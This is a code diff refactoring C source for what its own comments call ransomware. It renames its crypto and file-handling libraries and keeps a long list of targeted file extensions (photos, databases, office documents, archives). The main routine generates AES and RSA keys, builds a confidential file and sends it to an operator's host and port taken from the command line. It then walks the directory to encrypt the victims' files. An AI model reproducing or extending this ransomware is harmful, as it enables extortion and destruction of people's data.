@@ -8,18 +8,15 @@
 #include <errno.h>
 #include <sys/wait.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <arpa/inet.h>
-#include "llbis/create_flag.h"
-#include "llbis/cifrar.h"
-#include "llbis/gen_aes.h"
-#include "llbis/end_file.h"
-#include "llbis/send_file.h"
-#include "llbis/key_pub.h"
-//#include "list_files.h"
-//#include "find_ext.h"
+#include "lib/debug.h"
+#include "lib/key_pub.h"
+#include "lib/crypto.h"
+#include "lib/file_handling.h"
 
 
-char path[100000]="./test";
+char path[131072]="./test";
 char extension[][10] = {
     ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
     ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
@@ -37,12 +34,13 @@ char extension[][10] = {
     ".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",
     ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
     ".zip",".7zip"
-}; //agregar como lista de extensiones
+}; /* agregar como lista de extensiones */
 int ext_len = sizeof(extension)/(sizeof(char)*10);
 
 int find_ext(char file[]){
     for(int i=0; i<ext_len; i++){
-        if(strstr(file,extension[i]) != NULL && strstr(file,".ntd") == NULL){ // que no tenga .ntd (revisar doc strstr)
+        if(strstr(file, extension[i]) != NULL && strstr(file,".ntd") == NULL) {
+            /* que no tenga .ntd (revisar doc strstr) */
             return 1;
         }
     }
@@ -94,15 +92,15 @@ void main(int argc, char * argv[]){
     create_flag("./flag.ntd");
     //Key AES para el cifrado de ficheros
     char key[48];
-    strcat(key,gen_aes());
+    strcat(key, gen_aes());
     //Key RSA Pub
-    key_pub(1);
+    gen_key_pub();
     //Creando fichero con informacion confidencial para enviar al dueño del ransomware
-    end_file(key);
+    create_enc_file(key);
     //Enviando fichero confidencial
     send_file("enviame.enc",argv[1],argv[2]);
     //Del RSA Pub
-    key_pub(0);
+    rm_key_pub();
     //Listar ficheros y cifrar
     list_files(strlen(path),0,key);
 }
